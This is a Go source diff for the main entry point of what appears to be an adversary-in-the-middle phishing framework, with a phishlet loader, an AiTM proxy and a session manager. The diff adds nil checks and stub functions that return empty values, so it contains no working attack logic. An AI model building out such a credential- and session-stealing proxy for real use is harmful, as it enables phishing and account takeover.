@@ -11,8 +11,9 @@ import (
 	"syscall"
 	"time"
 
-	"github.com/gofiber/fiber/v2"
+	"github.com/redis/go-redis/v9"
 	"go.uber.org/zap"
+	"go.uber.org/zap/zapcore"
 )
 
 const (
@@ -76,7 +77,9 @@ func main() {
 	if err != nil {
 		logger.Fatal("Failed to initialize database", zap.Error(err))
 	}
-	defer db.Close()
+	if db != nil {
+		defer db.Close()
+	}
 
 	logger.Info("Database initialized", zap.String("path", cfg.DatabasePath))
 
@@ -100,20 +103,25 @@ func main() {
 	if err != nil {
 		logger.Fatal("Failed to create event bus", zap.Error(err))
 	}
-	defer eventBus.Close()
+	if eventBus != nil {
+		defer eventBus.Close()
+	}
 
 	logger.Info("Event bus initialized")
 
 	// Create Session Manager
 	sessionManager := NewSessionManager(redisClient, logger, cfg.SessionTTL)
 	logger.Info("Session manager initialized")
+	_ = sessionManager
 
 	// Create Phishlet Loader
 	phishletLoader := NewPhishletLoader(cfg.PhishletsPath, logger)
-	if err := phishletLoader.LoadAll(); err != nil {
-		logger.Warn("Failed to load some phishlets", zap.Error(err))
-	} else {
-		logger.Info("Phishlets loaded", zap.Int("count", phishletLoader.Count()))
+	if phishletLoader != nil {
+		if err := phishletLoader.LoadAll(); err != nil {
+			logger.Warn("Failed to load some phishlets", zap.Error(err))
+		} else {
+			logger.Info("Phishlets loaded", zap.Int("count", phishletLoader.Count()))
+		}
 	}
 
 	// Start services
@@ -121,11 +129,13 @@ func main() {
 	defer cancel()
 
 	// Start AiTM Proxy
-	go func() {
-		if err := proxy.Start(ctx); err != nil {
-			logger.Error("AiTM proxy failed", zap.Error(err))
-		}
-	}()
+	if proxy != nil {
+		go func() {
+			if err := proxy.Start(ctx); err != nil {
+				logger.Error("AiTM proxy failed", zap.Error(err))
+			}
+		}()
+	}
 
 	// Start API server
 	go func() {
@@ -196,4 +206,55 @@ func initRedis(cfg *Config, logger *zap.Logger) (*redis.Client, error) {
 	}
 
 	return client, nil
+}
+
+// ---------- stub helpers ---------------------------------------------------
+
+// NewDatabase returns a simple placeholder database connection.
+func NewDatabase(path string, logger *zap.Logger) (*Database, error) {
+	return &Database{}, nil
+}
+
+func (d *Database) Close() error {
+	return nil
+}
+
+func NewAiTMProxy(cfg *Config, db *Database, redisClient *redis.Client, logger *zap.Logger) (*AiTMProxy, error) {
+	return &AiTMProxy{}, nil
+}
+
+func (a *AiTMProxy) Start(ctx context.Context) error {
+	return nil
+}
+
+func NewEventBus(cfg *Config, logger *zap.Logger) (*EventBus, error) {
+	return &EventBus{}, nil
+}
+
+func (e *EventBus) Close() error {
+	return nil
+}
+
+func NewSessionManager(redisClient *redis.Client, logger *zap.Logger, ttl time.Duration) *SessionManager {
+	return &SessionManager{}
+}
+
+func NewPhishletLoader(path string, logger *zap.Logger) *PhishletLoader {
+	return &PhishletLoader{}
+}
+
+func (p *PhishletLoader) LoadAll() error {
+	return nil
+}
+
+func (p *PhishletLoader) Count() int {
+	return 0
+}
+
+func startAPIServer(cfg *Config, db *Database, redisClient *redis.Client, eventBus *EventBus, logger *zap.Logger) error {
+	return nil
+}
+
+func runBackgroundWorkers(ctx context.Context, cfg *Config, db *Database, redisClient *redis.Client, eventBus *EventBus, logger *zap.Logger) {
+	// stub
 }
